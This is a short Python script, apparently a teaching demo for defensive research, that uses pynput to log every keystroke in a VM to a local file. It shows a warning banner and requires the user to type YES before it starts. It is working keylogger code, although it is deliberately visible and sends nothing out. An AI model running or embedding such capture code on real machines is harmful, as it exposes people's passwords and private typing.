"""
LAB DEMO ONLY — Controlled keystroke capture for defensive research.

This script is intentionally visible and non-stealthy. It captures keystrokes
globally within the VM so the defender demo can detect it.

DO NOT run this outside an isolated lab VM.
DO NOT add stealth, persistence, or exfiltration.
"""

import os
import sys
import time
from datetime import datetime

from pynput import keyboard

LOG_FILE = "lab_capture.log"


def print_banner():
    banner = """
    ╔════════════════════════════════════════════════════════════════╗
    ║  ⚠️  LAB DEMO — AUTHORIZED SECURITY RESEARCH ONLY ⚠️            ║
    ║                                                                 ║
    ║  This script will capture keystrokes and write them to:         ║
    ║  {log_file}                                                     ║
    ║                                                                 ║
    ║  Run only inside an isolated VM with no sensitive data.         ║
    ║  Stop with Ctrl + C.                                            ║
    ╚════════════════════════════════════════════════════════════════╝
    """.format(log_file=os.path.abspath(LOG_FILE))
    print(banner)


def confirm():
    answer = input("Type YES to start the lab demo capture: ")
    if answer.strip().upper() != "YES":
        print("Aborted.")
        sys.exit(0)


def log_key(key):
    timestamp = datetime.now().isoformat()
    try:
        char = key.char
    except AttributeError:
        char = f"[{key.name}]"

    line = f"{timestamp}  {char}\n"
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(line)
    # Visible feedback so it's obvious the demo is running.
    print(f"[CAPTURED] {char}")


def main():
    print_banner()
    confirm()

    print(f"\nLogging keystrokes to {os.path.abspath(LOG_FILE)}")
    print("Press Ctrl + C to stop.\n")

    listener = keyboard.Listener(on_press=log_key)
    listener.start()

    try:
        while listener.is_alive():
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("\nStopping lab demo...")
    finally:
        listener.stop()
        listener.join()
        print(f"Capture stopped. Log written to {os.path.abspath(LOG_FILE)}")


if __name__ == "__main__":
    main()
